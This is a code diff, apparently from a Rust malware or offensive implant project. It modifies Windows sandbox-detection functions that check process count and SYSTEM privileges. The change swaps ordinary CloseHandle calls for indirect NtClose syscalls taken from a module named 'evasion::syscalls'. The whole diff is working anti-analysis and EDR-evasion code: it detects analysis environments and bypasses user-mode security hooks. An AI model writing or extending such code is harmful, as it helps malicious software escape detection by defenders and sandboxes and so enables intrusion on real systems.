@@ -17,13 +17,11 @@ unsafe fn username_is_sandbox() -> bool {
 
 #[cfg(target_os = "windows")]
 unsafe fn process_count_low() -> bool {
-    use windows_sys::Win32::{
-        Foundation::CloseHandle,
-        System::Diagnostics::ToolHelp::{
-            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
-            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
-        },
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
     };
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snap == -1isize { return false; }
     let mut entry: PROCESSENTRY32W = core::mem::zeroed();
@@ -33,7 +31,7 @@ unsafe fn process_count_low() -> bool {
         count += 1;
         while Process32NextW(snap, &mut entry) != 0 { count += 1; }
     }
-    CloseHandle(snap);
+    if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, snap as usize, 0, 0, 0, 0, 0); }
     count < 50
 }
 
@@ -54,13 +52,13 @@ unsafe fn hypervisor_bit_set() -> bool {
 #[cfg(target_os = "windows")]
 unsafe fn running_as_system() -> bool {
     use windows_sys::Win32::{
-        Foundation::CloseHandle,
         Security::{
             GetTokenInformation, OpenProcessToken, TOKEN_QUERY, TOKEN_USER,
             TokenUser,
         },
         System::Threading::GetCurrentProcess,
     };
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
 
     let mut token_handle: windows_sys::Win32::Foundation::HANDLE = 0;
     if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) == 0 {
@@ -76,7 +74,7 @@ unsafe fn running_as_system() -> bool {
         buf.len() as u32,
         &mut return_len,
     );
-    CloseHandle(token_handle);
+    if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, token_handle as usize, 0, 0, 0, 0, 0); }
     if ok == 0 { return false; }
 
     // TOKEN_USER.User.Sid points to a SID. S-1-5-18 (LocalSystem) has:
